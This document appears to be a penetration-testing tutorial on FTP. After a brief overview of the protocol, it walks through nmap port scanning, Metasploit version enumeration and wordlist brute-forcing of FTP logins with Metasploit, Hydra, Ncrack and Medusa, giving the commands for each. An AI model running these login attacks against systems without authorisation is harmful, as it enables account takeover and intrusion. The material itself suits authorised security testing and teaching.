FTP stands for File Transfer Protocol used for the transfer of computer files such as docs, PDF, multimedia and etc between a client and server on a computer network
via port 21. Port 21 is default port which gets open when FTP is activated for sharing data.

Uses of FTP
  *An FTP site is a web site where users can easily upload or download specific files.
  *FTP by mail allows users without access to the Internet to access and copy files using anonymous FTP by sending an email message to ftpmail@decwrl.dec.com and 
   puting the word help in the body of the text.
  *FTP Explorer is an FTP client based on Windows 95 file manager (Windows 95 Explorer).
  *An FTP server is a dedicated computer which provides FTP service. This invites hackers and necessitates security hardware or software such as utilizing usernames,
   passwords, and file access control.
  *An FTP client is a computer application which accesses an FTP server. While doing so, users should block incoming FTP connection attempts using passive mode and 
   should check for viruses on all downloaded files.


Scanning FTP with nmap
An attacker may take help of nmap to verify whether port 21 is activated or not. For FTP penetration, we are also using nmap in order to scan the targeted system 
for open FTP port.
  nmap -p 21 IPADDRESS

Version Enumeration on FTP
Try to get the FTP version through ftp_version on Metasploit. Open the terminal in your Kali Linux and Load Metasploit framework now type the following command to 
scan for FTP version.
 
  use auxiliary/scanner/ftp/ftp_version
  msf auxiliary(ftp_version) > set rhosts IPADDRESS
  msf auxiliary(ftp_version) > exploit

FTP Brute force Attack
Open the terminal in your Kali Linux and Load Metasploit framework now type the following command to Brute force FTP login.

  use auxiliary/scanner/ftp/ftp_login
  msf auxiliary(ftp_login) > set rhosts IPADDRESS
  msf auxiliary(ftp_login) > set user_file /root/Desktop/user.txt
  msf auxiliary(ftp_login) > set pass_file /root/Desktop/pass.txt 
  msf auxiliary(ftp_login) > set stop_on_success true
  msf auxiliary(ftp_login) > exploit
  
Password Cracking:FTP
Hydra
Hydra is often the tool of choice. It can perform rapid dictionary attacks against more than 50 protocols, including telnet, ftp, http, https, smb, several 
databases, and much more.
Run the following command
  hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt IPADDRESS ftp
 
Ncrack
Ncrack is a high-speed network authentication cracking tool. It was built to help companies secure their networks by proactively testing all their hosts and 
networking devices for poor passwords. 
Run the following command
  ncrack -v -U /root/Desktop/user.txt -P /root/Desktop/pass.txt IPADDRESS
  
Medusa
Medusa is intended to be a speedy, massively parallel, modular, login brute-forcer. It supports many protocols: AFP, CVS, FTP, HTTP, IMAP, rlogin, SSH, Subversion,
and VNC to name a few
Run the following command
  medusa -h IPADDRESS -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M ftp

Metasploit
This module will test FTP logins on a range of machines and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.
Open Kali terminal type msfconsole
Now type 
  use auxiliary/scanner/ftp/ftp_login
  msf exploit (ftp_login)>set rhosts IPADDRESS
  msf exploit (ftp_login)>set user_file /root/Desktop/user.txt
  msf exploit (ftp_login)>set pass_file /root/Desktop/pass.txt
  msf exploit (ftp_login)>set stop_on_success true
  msf exploit (ftp_login)> exploit
